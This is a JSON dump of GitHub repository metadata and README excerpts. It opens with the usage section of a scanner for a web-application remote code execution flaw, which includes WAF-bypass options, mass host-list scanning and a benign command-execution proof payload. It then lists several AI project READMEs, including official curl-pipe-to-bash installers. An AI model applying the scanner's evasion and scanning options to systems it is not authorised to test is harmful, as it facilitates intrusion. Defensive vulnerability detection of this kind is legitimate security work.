WAF content inspection that only analyzes the first portion of request bodies. The default size is 128KB, configurable via `--waf-bypass-size`. When WAF bypass is enabled, the timeout is automatically increased to 20 seconds (unless explicitly set).\n\n### Vercel WAF Bypass\n\nThe `--vercel-waf-bypass` flag uses an alternative payload variant specifically designed to bypass Vercel WAF protections. This uses a different multipart structure with an additional form field.\n\n### Windows Mode\n\nThe `--windows` flag switches the payload from Unix shell (`echo $((41*271))`) to PowerShell (`powershell -c \"41*271\"`) for targets running on Windows.\n\n## Requirements\n\n- Python 3.9+\n- requests\n- tqdm\n\n## Installation\n\n```\npip install -r requirements.txt\n```\n\n## Usage\n\nScan a single host:\n\n```\npython3 scanner.py -u https://example.com\n```\n\nScan a list of hosts:\n\n```\npython3 scanner.py -l hosts.txt\n```\n\nScan with multiple threads and save results:\n\n```\npython3 scanner.py -l hosts.txt -t 20 -o results.json\n```\n\nScan with custom headers:\n\n```\npython3 scanner.py -u https://example.com -H \"Authorization: Bearer token\" -H \"Cookie: session=abc\"\n```\n\nUse safe side-channel detection:\n\n```\npython3 scanner.py -u https://example.com --safe-check\n```\n\nScan Windows targets:\n\n```\npython3 scanner.py -u https://example.com --windows\n```\n\nScan with WAF bypass:\n\n```\npython3 scanner.py -u https://example.com --waf-bypass\n```\n\nScan custom paths:\n\n```\npython3 scanner.py -u https://example.com --path /_next\npython3 scanner.py -u https://example.com --path /_next --path /api\npython3 scanner.py -u https://example.com --path-file paths.txt\n```\n\n## Options\n\n```\n-u, --url         Single URL to check\n-l, --list        File containing hosts (one per line)\n-t, --threads     Number of concurrent threads (default: 10)\n--timeout         Request timeout in seconds (default: 10)\n-o, --output      Output file for results (JSON)\n--all-results     Save all results, not just vulnerable hosts\n-k, --insecure    Disable SSL certificate verification\n-H, --header      Custom header (can be used multiple times)\n-v, --verbose     Show response details for vulnerable hosts\n-q, --quiet       Only output vulnerable hosts\n--no-color        Disable colored output\n--safe-check      Use safe side-channel detection instead of RCE PoC\n--windows         Use Windows PowerShell payload instead of Unix shell\n--waf-bypass      Add junk data to bypass WAF content inspection\n--waf-bypass-size Size of junk data in KB (default: 128)\n--path            Custom path to test (can be used multiple times)\n--path-file       File containing paths to test (one per line)\n```\n\n## Credits\n\nThe RCE PoC was originally disclosed by [@maple3142](https://x.com/maple3142) -- we are incredibly grateful for their work in publishing a working PoC.\n\nThis tooling originally was built out as a safe way to detect the RCE. This functionality is still available via `--safe-check`, the \"safe detection\" mode.\n\n- Assetnote Security Research Team - [Adam Kues, Tomais Williamson, Dylan Pindur, Patrik GrobshÃ¤user, Shubham Shah](https://x.com/assetnote)\n- [xEHLE_](https://x.com/xEHLE_) - RCE output reflection in resp header\n- [Nagli](https://x.com/galnagli)\n\n## Output\n\nResults are printed to the terminal. When using `-o`, vulnerable hosts are saved to a JSON file containing the full HTTP request and response for verification.\n",
      "default_branch": "master"
    },
    "fetched_at": "2025-12-21T02:54:32.186552"
  },
  {
    "basic_info": {
      "name": "mistral-vibe",
      "full_name": "mistralai/mistral-vibe",
      "owner": "mistralai",
      "description": "Minimal CLI coding agent by Mistral",
      "url": "https://github.com/mistralai/mistral-vibe",
      "clone_url": "https://github.com/mistralai/mistral-vibe.git",
      "ssh_url": "git@github.com:mistralai/mistral-vibe.git",
      "homepage": "",
      "created_at": "2025-12-08T18:56:59Z",
      "updated_at": "2025-12-20T23:42:54Z",
      "pushed_at": "2025-12-18T17:36:26Z"
    },
    "stats": {
      "stars": 2215,
      "forks": 177,
      "watchers": 2215,
      "open_issues": 120,
      "size": 169
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 957637,
        "Nix": 4231,
        "Shell": 3363
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "# Mistral Vibe\n\n[![PyPI Version](https://img.shields.io/pypi/v/mistral-vibe)](https://pypi.org/project/mistral-vibe)\n[![Python Version](https://img.shields.io/badge/python-3.12%2B-blue)](https://www.python.org/downloads/release/python-3120/)\n[![CI Status](https://github.com/mistralai/mistral-vibe/actions/workflows/ci.yml/badge.svg)](https://github.com/mistralai/mistral-vibe/actions/workflows/ci.yml)\n[![License](https://img.shields.io/github/license/mistralai/mistral-vibe)](https://github.com/mistralai/mistral-vibe/blob/main/LICENSE)\n\n```\nâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆ    â–ˆâ–ˆ    â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆ          â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆ      â–ˆâ–ˆ      â–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\n```\n\n**Mistral's open-source CLI coding assistant.**\n\nMistral Vibe is a command-line coding assistant powered by Mistral's models. It provides a conversational interface to your codebase, allowing you to use natural language to explore, modify, and interact with your projects through a powerful set of tools.\n\n> [!WARNING]\n> Mistral Vibe works on Windows, but we officially support and target UNIX environments.\n\n### One-line install (recommended)\n\n**Linux and macOS**\n\n```bash\ncurl -LsSf https://mistral.ai/vibe/install.sh | bash\n```\n\n**Windows**\n\nFirst, install uv\n```bash\npowershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"\n```\n\nThen, use uv command below.\n\n### Using uv\n\n```bash\nuv tool install mistral-vibe\n```\n\n### Using pip\n\n```bash\npip install mistral-vibe\n```\n\n## Features\n\n- **Interactive Chat**: A conversational AI agent that understands your requests and breaks down complex tasks.\n- **Powerful Toolset**: A suite of tools for file manipulation, code searching, version control, and command execution, right from the chat prompt.\n  - Read, write, and patch files (`read_file`, `write_file`, `search_replace`).\n  - Execute shell commands in a stateful terminal (`bash`).\n  - Recursively search code with `grep` (with `ripgrep` support).\n  - Manage a `todo` list to track the agent's work.\n- **Project-Aware Context**: Vibe automatically scans your project's file structure and Git status to provide relevant context to the agent, improving its understanding of your codebase.\n- **Advanced CLI Experience**: Built with modern libraries for a smooth and efficient workflow.\n  - Autocompletion for slash commands (`/`) and file paths (`@`).\n  - Persistent command history.\n  - Beautiful Themes.\n- **Highly Configurable**: Customize models, providers, tool permissions, and UI preferences through a simple `config.toml` file.\n- **Safety First**: Features tool execution approval.\n\n## Quick Start\n\n1. Navigate to your project's root directory:\n\n   ```bash\n   cd /path/to/your/project\n   ```\n\n2. Run Vibe:\n\n   ```bash\n   vibe\n   ```\n\n3. If this is your first time running Vibe, it will:\n\n   - Create a default configuration file at `~/.vibe/config.toml`\n   - Prompt you to enter your API key if it's not already configured\n   - Save your API key to `~/.vibe/.env` for future use\n\n4. Start interacting with the agent!\n\n   ```\n   > Can you find all instances of the word \"TODO\" in the project?\n\n   ğŸ¤– The user wants to find all instances of \"TODO\". The `grep` tool is perfect for this. I will use it to search the current directory.\n\n   > grep(pattern=\"TODO\", path=\".\")\n\n   ... (grep tool output) ...\n\n   ğŸ¤– I found the following \"TODO\" comments in your project.\n   ```\n\n## Usage\n\n### Interactive Mode\n\nSimply run `vibe` to enter the interactive chat loop.\n\n- **Multi-line Input**: Press `Ctrl+J` or `Shift+Enter` for select terminals to insert a newline.\n- **File Paths**: Reference files in your prompt using the `@` symbol for smart autocompletion (e.g., `> Read the file @src/agent.py`).\n- **Shell Commands**: Prefix any command with `!` to execute it directly in your shell, bypassing the agent (e.g., `> !ls -l`).\n\nYou can start Vibe with a prompt with the following command:\n\n```bash\nvibe \"Refactor the main function in cli/main.py to be more modular.\"\n```\n\n**Note**: The `--auto-approve` flag automatically approves all tool executions without prompting. In interactive mode, you can also toggle auto-approve on/off using `Shift+Tab`.\n\n### Programmatic Mode\n\nYou can run Vibe non-interactively by piping input or using the `--prompt` flag. This is useful for scripting.\n\n```bash\nvibe --prompt \"Refactor the main function in cli/main.py to be more modular.\"\n```\n\nby default it will use `auto-approve` mode.\n\n### Slash Commands\n\nUse slash commands for meta-actions and configuration changes during a session.\n\n## Configuration\n\nVibe is configured via a `config.toml` file. It looks for this file first in `./.vibe/config.toml` and then falls back to `~/.vibe/config.toml`.\n\n### API Key Configuration\n\nVibe supports multiple ways to configure your API keys:\n\n1. **Interactive Setup (Recommended for first-time users)**: When you run Vibe for the first time or if your API key is missing, Vibe will prompt you to enter it. The ke",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:33.287132"
  },
  {
    "basic_info": {
      "name": "TRELLIS.2",
      "full_name": "microsoft/TRELLIS.2",
      "owner": "microsoft",
      "description": "Native and Compact Structured Latents for 3D Generation",
      "url": "https://github.com/microsoft/TRELLIS.2",
      "clone_url": "https://github.com/microsoft/TRELLIS.2.git",
      "ssh_url": "git@github.com:microsoft/TRELLIS.2.git",
      "homepage": null,
      "created_at": "2025-11-26T10:04:35Z",
      "updated_at": "2025-12-21T02:06:07Z",
      "pushed_at": "2025-12-17T02:27:22Z"
    },
    "stats": {
      "stars": 1849,
      "forks": 121,
      "watchers": 1849,
      "open_issues": 32,
      "size": 673562
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 625333,
        "C++": 116370,
        "Cuda": 45762,
        "Shell": 4506,
        "C": 3604
      },
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "![](assets/teaser.webp)\n\n# Native and Compact Structured Latents for 3D Generation\n\n<a href=\"https://arxiv.org/abs/2512.14692\"><img src=\"https://img.shields.io/badge/Paper-Arxiv-b31b1b.svg\" alt=\"Paper\"></a>\n<a href=\"https://huggingface.co/microsoft/TRELLIS.2-4B\"><img src=\"https://img.shields.io/badge/Hugging%20Face-Model-yellow\" alt=\"Hugging Face\"></a>\n<a href=\"https://huggingface.co/spaces/microsoft/TRELLIS.2\"><img src=\"https://img.shields.io/badge/Hugging%20Face-Demo-blueviolet\"></a>\n<a href=\"https://microsoft.github.io/TRELLIS.2\"><img src=\"https://img.shields.io/badge/Project-Website-blue\" alt=\"Project Page\"></a>\n<a href=\"LICENSE\"><img src=\"https://img.shields.io/badge/License-MIT-green\" alt=\"License\"></a>\n\nhttps://github.com/user-attachments/assets/63b43a7e-acc7-4c81-a900-6da450527d8f\n\n*(Compressed version due to GitHub size limits. See the full-quality video on our project page!)*\n\n**TRELLIS.2** is a state-of-the-art large 3D generative model (4B parameters) designed for high-fidelity **image-to-3D** generation. It leverages a novel \"field-free\" sparse voxel structure termed **O-Voxel** to reconstruct and generate arbitrary 3D assets with complex topologies, sharp features, and full PBR materials.\n\n\n## âœ¨ Features\n\n### 1. High Quality, Resolution & Efficiency\nOur 4B-parameter model generates high-resolution fully textured assets with exceptional fidelity and efficiency using vanilla DiTs. It utilizes a Sparse 3D VAE with 16Ã— spatial downsampling to encode assets into a compact latent space.\n\n| Resolution | Total Time* | Breakdown (Shape + Mat) |\n| :--- | :--- | :--- |\n| **512Â³** | **~3s** | 2s + 1s |\n| **1024Â³** | **~17s** | 10s + 7s |\n| **1536Â³** | **~60s** | 35s + 25s |\n\n<small>*Tested on NVIDIA H100 GPU.</small>\n\n### 2. Arbitrary Topology Handling\nThe **O-Voxel** representation breaks the limits of iso-surface fields. It robustly handles complex structures without lossy conversion:\n*   âœ… **Open Surfaces** (e.g., clothing, leaves)\n*   âœ… **Non-manifold Geometry**\n*   âœ… **Internal Enclosed Structures**\n\n### 3. Rich Texture Modeling\nBeyond basic colors, TRELLIS.2 models arbitrary surface attributes including **Base Color, Roughness, Metallic, and Opacity**, enabling photorealistic rendering and transparency support.\n\n### 4. Minimalist Processing\nData processing is streamlined for instant conversions that are fully **rendering-free** and **optimization-free**.\n*   **< 10s** (Single CPU): Textured Mesh â†’ O-Voxel\n*   **< 100ms** (CUDA): O-Voxel â†’ Textured Mesh\n\n\n## ğŸ—ºï¸ Roadmap\n\n- [x] Paper release\n- [x] Release image-to-3D inference code\n- [x] Release pretrained checkpoints (4B)\n- [x] Hugging Face Spaces demo\n- [ ] Release shape-conditioned texture generation inference code (Current schdule: before 12/24/2025)\n- [ ] Release training code (Current schdule: before 12/31/2025)\n\n\n## ğŸ› ï¸ Installation\n\n### Prerequisites\n- **System**: The code is currently tested only on **Linux**.\n- **Hardware**: An NVIDIA GPU with at least 24GB of memory is necessary. The code has been verified on NVIDIA A100 and H100 GPUs.  \n- **Software**:   \n  - The [CUDA Toolkit](https://developer.nvidia.com/cuda-toolkit-archive) is needed to compile certain packages. Recommended version is 12.4.  \n  - [Conda](https://docs.anaconda.com/miniconda/install/#quick-command-line-install) is recommended for managing dependencies.  \n  - Python version 3.8 or higher is required. \n\n### Installation Steps\n1. Clone the repo:\n    ```sh\n    git clone -b main https://github.com/microsoft/TRELLIS.2.git --recursive\n    cd TRELLIS.2\n    ```\n\n2. Install the dependencies:\n    \n    **Before running the following command there are somethings to note:**\n    - By adding `--new-env`, a new conda environment named `trellis2` will be created. If you want to use an existing conda environment, please remove this flag.\n    - By default the `trellis2` environment will use pytorch 2.6.0 with CUDA 12.4. If you want to use a different version of CUDA, you can remove the `--new-env` flag and manually install the required dependencies. Refer to [PyTorch](https://pytorch.org/get-started/previous-versions/) for the installation command.\n    - If you have multiple CUDA Toolkit versions installed, `CUDA_HOME` should be set to the correct version before running the command. For example, if you have CUDA Toolkit 12.4 and 13.0 installed, you can run `export CUDA_HOME=/usr/local/cuda-12.4` before running the command.\n    - By default, the code uses the `flash-attn` backend for attention. For GPUs do not support `flash-attn` (e.g., NVIDIA V100), you can install `xformers` manually and set the `ATTN_BACKEND` environment variable to `xformers` before running the code. See the [Minimal Example](#minimal-example) for more details.\n    - The installation may take a while due to the large number of dependencies. Please be patient. If you encounter any issues, you can try to install the dependencies one by one, specifying one flag at a time.\n    - If you encounter any issues during the installa",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:34.401379"
  },
  {
    "basic_info": {
      "name": "agentskills",
      "full_name": "agentskills/agentskills",
      "owner": "agentskills",
      "description": "Specification and documentation for Agent Skills",
      "url": "https://github.com/agentskills/agentskills",
      "clone_url": "https://github.com/agentskills/agentskills.git",
      "ssh_url": "git@github.com:agentskills/agentskills.git",
      "homepage": "https://agentskills.io",
      "created_at": "2025-12-16T15:47:19Z",
      "updated_at": "2025-12-21T02:54:00Z",
      "pushed_at": "2025-12-20T02:41:18Z"
    },
    "stats": {
      "stars": 1663,
      "forks": 68,
      "watchers": 1663,
      "open_issues": 17,
      "size": 92
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 29204,
        "Shell": 268
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# Agent Skills\n\n[Agent Skills](https://agentskills.io) are a simple, open format for giving agents new capabilities and expertise.\n\nSkills are folders of instructions, scripts, and resources that agents can discover and use to perform better at specific tasks. Write once, use everywhere.\n\n## Getting Started\n\n- [Documentation](https://agentskills.io) - Guides and tutorials\n- [Specification](https://agentskills.io/specification) - Format details\n- [Example Skills](https://github.com/anthropics/skills) - See what's possible\n\nThis repo contains the specification, documentation, and reference SDK. Also see a list of example skills [here](https://github.com/anthropics/skills).\n\n## About\n\nAgent Skills is an open format maintained by [Anthropic](https://anthropic.com) and open to contributions from the community.",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:35.522491"
  },
  {
    "basic_info": {
      "name": "gelab-zero",
      "full_name": "stepfun-ai/gelab-zero",
      "owner": "stepfun-ai",
      "description": "GELab: GUI Exploration Lab. One of the best GUI agent solutions in the galaxy, built by the StepFun-GELab team and powered by Stepâ€™s research capabilities.",
      "url": "https://github.com/stepfun-ai/gelab-zero",
      "clone_url": "https://github.com/stepfun-ai/gelab-zero.git",
      "ssh_url": "git@github.com:stepfun-ai/gelab-zero.git",
      "homepage": "https://opengelab.github.io/",
      "created_at": "2025-11-28T14:42:44Z",
      "updated_at": "2025-12-21T02:50:23Z",
      "pushed_at": "2025-12-19T02:55:39Z"
    },
    "stats": {
      "stars": 1623,
      "forks": 133,
      "watchers": 1623,
      "open_issues": 28,
      "size": 165868
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 176584
      },
      "license": "MIT License",
      "topics": [
        "agent",
        "gui-agents",
        "phone-use-agent",
        "pua"
      ]
    },
    "content": {
      "readme": "![GELab-Zero Main Image](./images/main_en.png)\n\n> ğŸ‘‹ Hi, everyone! We are proud to present the first fully open-source GUI Agent with both model and infrastructure. Our solution features plug-and-play engineering with no cloud dependencies, giving you complete privacy control.\n\n<p align=\"center\">\n  <!-- <a href=\"https://github.com/stepfun-ai/gelab-zero\"><img src=\"https://img.shields.io/badge/ğŸ’»%20GitHub-Repository-black\" alt=\"GitHub\" /></a> -->\n  <a href=\"https://arxiv.org/abs/2512.15431\"><img src=\"https://img.shields.io/badge/arXiv-Step--GUI Technical Report-B31B1B.svg?logo=arxiv&logoColor=white\" alt=\"arXiv\" /></a>\n  <a href=\"https://opengelab.github.io/\"><img src=\"https://img.shields.io/badge/ğŸŒ%20Website-Project%20Page-blue\" alt=\"Website\" /></a>\n  <a href=\"https://huggingface.co/stepfun-ai/GELab-Zero-4B-preview\"><img src=\"https://img.shields.io/badge/ğŸ¤—%20Hugging%20Face-GELab--Zero--4B--preview-orange\" alt=\"Hugging Face Model\" /></a>\n  <a href=\"https://huggingface.co/datasets/stepfun-ai/AndroidDaily\"><img src=\"https://img.shields.io/badge/ğŸ“š%20Hugging%20Face-AndroidDaily-yellow\" alt=\"Hugging Face Dataset\" /></a>\n  <a href=\"https://modelscope.cn/models/stepfun-ai/GELab-Zero-4B-preview\"><img src=\"https://img.shields.io/badge/ğŸ¤–%20Model%20Scope-GELab--Zero--4B--preview-blue\" alt=\"Model Scope\" /></a>\n</p>\n\n<p align=\"center\">\n  <a href=\"./README.md\">English</a> |\n  <a href=\"./README_CN.md\">ç®€ä½“ä¸­æ–‡</a>\n</p>\n\n## ğŸ“° News\n\n* ğŸ **[2025-12-18]** We release **Step-GUI Technical Report** on [**arXiv**](https://arxiv.org/abs/2512.15431)!\n* ğŸ **[2025-12-18]** We release a more powerful **API** for GUI automation tasks. [Apply for API access here](https://wvixbzgc0u7.feishu.cn/share/base/form/shrcnNStxEmuE7aY6jTW07CZHMf)!\n* ğŸ **[2025-12-12]** We release **MCP-Server** support for multi-device management and task distribution. See [Installation & Quick Start](#-installation-quick-start) and [MCP-Server Setup](#optional-mcp-server-setup) for setup instructions.\n* ğŸ **[2025-12-1]** We thank the following projects and authors for providing quantization tools & tutorials: [GGUF_v1](https://huggingface.co/bartowski/stepfun-ai_GELab-Zero-4B-preview-GGUF), [GGUF_v2](https://huggingface.co/noctrex/GELab-Zero-4B-preview-GGUF), [EXL3](https://huggingface.co/ArtusDev/stepfun-ai_GELab-Zero-4B-preview-EXL3), [Tutorials_CN](http://xhslink.com/o/1WrmgHGWFYh), [Tutorials_EN](https://www.youtube.com/watch?v=4BMiDyQOpos)\n* ğŸ **[2025-11-31]** We release a lightweight **4B** model GELab-Zero-4B-preview on [**Hugging Face**](https://huggingface.co/stepfun-ai/GELab-Zero-4B-preview) and [**Model Scope**](https://modelscope.cn/models/stepfun-ai/GELab-Zero-4B-preview).\n* ğŸ **[2025-11-31]** We release the tasks from the [**AndroidDaily**](https://huggingface.co/datasets/stepfun-ai/AndroidDaily) benchmark.\n* ğŸ **[2025-11-30]** We release the current **GELab-Zero** engineering infrastructure.\n* ğŸ **[2025-10]** Our [**research**](https://github.com/summoneryhl/gelab-engine) paper on GELab-Engine is accepted by **NeurIPS 2025**.\n\n\n\n## ğŸ“‘ Table of Contents\n\n- [ğŸ“– Background](#-background)\n- [ğŸ¥ Application Demonstrations](#-application-demonstrations)\n- [ğŸ† Open Benchmark](#-open-benchmark)\n- [ğŸš€ Installation & Quick Start](#-installation-quick-start)\n- [ğŸ“ Citation](#-citation)\n\n\n## ğŸ“§ Contact\n\nYou can contact us and communicate with us by joining our WeChat group:\n\n| WeChat Group |\n|:-------------------------:|\n| <img src=\"images/wechat_group2.jpeg\" width=\"200\"> |\n\n\n\n## ğŸ“– Background\n\nAs AI experiences increasingly penetrate consumer-grade devices, Mobile Agent research is at a critical juncture: transitioning from **\"feasibility verification\"** to **\"large-scale application.\"** While GUI-based solutions offer universal compatibility, the fragmentation of mobile ecosystems imposes heavy engineering burdens that hinder innovation. GELab-Zero is designed to dismantle these barriers.\n\n* âš¡ï¸ **Out-of-the-Box Full-Stack Infrastructure** \nResolves the fragmentation of the mobile ecosystem with a unified, one-click inference pipeline. It automatically handles multi-device ADB connections, dependencies, and permissions, allowing developers to focus on strategic innovation rather than engineering infrastructure.\n\n* ğŸ–¥ï¸ **Consumer-Grade Local Deployment** \nFeatures a built-in 4B GUI Agent model **fully optimized for Mac (M-series) and NVIDIA RTX 4060**. It supports complete local execution, ensuring data privacy and low latency on standard consumer hardware.\n\n* ğŸ“± **Flexible Task Distribution & Orchestration** \nSupports distributing tasks across multiple devices with interaction trajectory recording. It offers three versatile modesâ€”ReAct loops, multi-agent collaboration, and scheduled tasksâ€”to handle complex, real-world business scenarios.\n\n* ğŸš€ **Accelerate from Prototype to Production** \nEmpowers developers to rapidly validate interaction strategies while allowing enterprises to directly reuse the underlying infrastructure for zero-cost MCP integration, bridging the critical gap",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:36.653996"
  },
  {
    "basic_info": {
      "name": "DeepSeek-Math-V2",
      "full_name": "deepseek-ai/DeepSeek-Math-V2",
      "owner": "deepseek-ai",
      "description": null,
      "url": "https://github.com/deepseek-ai/DeepSeek-Math-V2",
      "clone_url": "https://github.com/deepseek-ai/DeepSeek-Math-V2.git",
      "ssh_url": "git@github.com:deepseek-ai/DeepSeek-Math-V2.git",
      "homepage": null,
      "created_at": "2025-11-27T06:12:26Z",
      "updated_at": "2025-12-21T02:33:07Z",
      "pushed_at": "2025-12-01T07:01:42Z"
    },
    "stats": {
      "stars": 1493,
      "forks": 118,
      "watchers": 1493,
      "open_issues": 9,
      "size": 1028
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 44633,
        "Shell": 620
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "<!-- markdownlint-disable first-line-h1 -->\n<!-- markdownlint-disable html -->\n<!-- markdownlint-disable no-duplicate-header -->\n\n<div align=\"center\">\n  <img src=\"https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/logo.svg?raw=true\" width=\"60%\" alt=\"DeepSeek-V3\" />\n</div>\n<hr>\n<div align=\"center\" style=\"line-height: 1;\">\n  <a href=\"https://www.deepseek.com/\"><img alt=\"Homepage\"\n    src=\"https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/badge.svg?raw=true\"/></a>\n  <a href=\"https://chat.deepseek.com/\"><img alt=\"Chat\"\n    src=\"https://img.shields.io/badge/ğŸ¤–%20Chat-DeepSeek%20V3-536af5?color=536af5&logoColor=white\"/></a>\n  <a href=\"https://huggingface.co/deepseek-ai\"><img alt=\"Hugging Face\"\n    src=\"https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-DeepSeek%20AI-ffc107?color=ffc107&logoColor=white\"/></a>\n  <br>\n  <a href=\"https://discord.gg/Tc7c45Zzu5\"><img alt=\"Discord\"\n    src=\"https://img.shields.io/badge/Discord-DeepSeek%20AI-7289da?logo=discord&logoColor=white&color=7289da\"/></a>\n  <a href=\"https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/qr.jpeg?raw=true\"><img alt=\"Wechat\"\n    src=\"https://img.shields.io/badge/WeChat-DeepSeek%20AI-brightgreen?logo=wechat&logoColor=white\"/></a>\n  <a href=\"https://twitter.com/deepseek_ai\"><img alt=\"Twitter Follow\"\n    src=\"https://img.shields.io/badge/Twitter-deepseek_ai-white?logo=x&logoColor=white\"/></a>\n  <br>\n  <a href=\"LICENSE\" style=\"margin: 2px;\">\n    <img alt=\"License\" src=\"https://img.shields.io/badge/License-Apache 2.0-f5de53?&color=f5de53\" style=\"display: inline-block; vertical-align: middle;\"/>\n  </a>\n  <br>\n</div>\n\n# DeepSeekMath-V2: Towards Self-Verifiable Mathematical Reasoning\n\n## 1. Introduction\n\nLarge language models have made significant progress in mathematical reasoning, which serves as an important testbed for AI and could impact scientific research if further advanced.\nBy scaling reasoning with reinforcement learning that rewards correct final answers, LLMs have improved from poor performance to saturating quantitative reasoning competitions like AIME and HMMT in one year.\nHowever, this approach faces fundamental limitations.\nPursuing higher final answer accuracy doesn't address a key issue: correct answers don't guarantee correct reasoning.\nMoreover, many mathematical tasks like theorem proving require rigorous step-by-step derivation rather than numerical answers, making final answer rewards inapplicable.\nTo push the limits of deep reasoning, we believe it is necessary to verify the comprehensiveness and rigor of mathematical reasoning.\nSelf-verification is particularly important for scaling test-time compute, especially for open problems without known solutions.\nTowards self-verifiable mathematical reasoning, we investigate how to train an accurate and faithful LLM-based verifier for theorem proving.\nWe then train a proof generator using the verifier as the reward model, and incentivize the generator to identify and resolve as many issues as possible in their own proofs before finalizing them.\nTo maintain the generation-verification gap as the generator becomes stronger, we propose to scale verification compute to automatically label new hard-to-verify proofs, creating training data to further improve the verifier.\nOur resulting model, DeepSeekMath-V2, demonstrates strong theorem-proving capabilities, achieving gold-level scores on IMO 2025 and CMO 2024 and a near-perfect 118/120 on Putnam 2024 with scaled test-time compute.\nWhile much work remains, these results suggest that self-verifiable mathematical reasoning is a feasible research direction that may help develop more capable mathematical AI systems.\n\n## 2. Evaluation Results\n\nBelow are evaluation results on [IMO-ProofBench](https://github.com/google-deepmind/superhuman/tree/main/imobench) (developed by the DeepMind team behind DeepThink IMO-Gold) and recent mathematics competitions including IMO 2025, CMO 2024, and Putnam 2024.\nModel predictions are available in the `outputs` folder.\n\n**IMO-ProofBench**\n\n<p align=\"center\">\n  <img width=\"100%\" src=\"figures/IMO-ProofBench.png\">\n</p>\n\n\n---\n\n**Mathematics Competitions**\n\n<p align=\"center\">\n  <img width=41%\" src=\"figures/Competitions.png\">\n</p>\n\n## 4. Download & Quick Start\n\nDeepSeekMath-V2 is built on top of DeepSeek-V3.2-Exp-Base, which can be downloaded from [ğŸ¤— HuggingFace](https://huggingface.co/deepseek-ai/DeepSeek-Math-V2).\nFor inference support, please refer to [the DeepSeek-V3.2-Exp github repository](https://github.com/deepseek-ai/DeepSeek-V3.2-Exp).\n\n## 6. License\nThe use of DeepSeekMath-V2 models is subject to [the Model License](LICENSE).\n\n## 7. Citation\n\n```\n@misc{deepseek-math-v2,\n  author = {Zhihong Shao, Yuxiang Luo, Chengda Lu, Z.Z. Ren, Jiewen Hu, Tian Ye, Zhibin Gou, Shirong Ma, Xiaokang Zhang},\n  title = {DeepSeekMath-V2: Towards Self-Verifiable Mathematical Reasoning},\n  year = {2025},\n}\n```\n\n## 8. Contact\n\nIf you have any questions, please raise an issue or contact us at [service@deep",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:37.769407"
  },
  {
    "basic_info": {
      "name": "ech-wk",
      "full_name": "byJoey/ech-wk",
      "owner": "byJoey",
      "description": null,
      "url": "https://github.com/byJoey/ech-wk",
      "clone_url": "https://github.com/byJoey/ech-wk.git",
      "ssh_url": "git@github.com:byJoey/ech-wk.git",
      "homepage": null,
      "created_at": "2025-12-06T07:20:27Z",
      "updated_at": "2025-12-21T02:33:08Z",
      "pushed_at": "2025-12-19T09:00:15Z"
    },
    "stats": {
      "stars": 1463,
      "forks": 806,
      "watchers": 1463,
      "open_issues": 44,
      "size": 199
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 75305,
        "Go": 38017,
        "Shell": 13407,
        "JavaScript": 5189
      },
      "license": null,
      "topics": []
    },
    "content": {
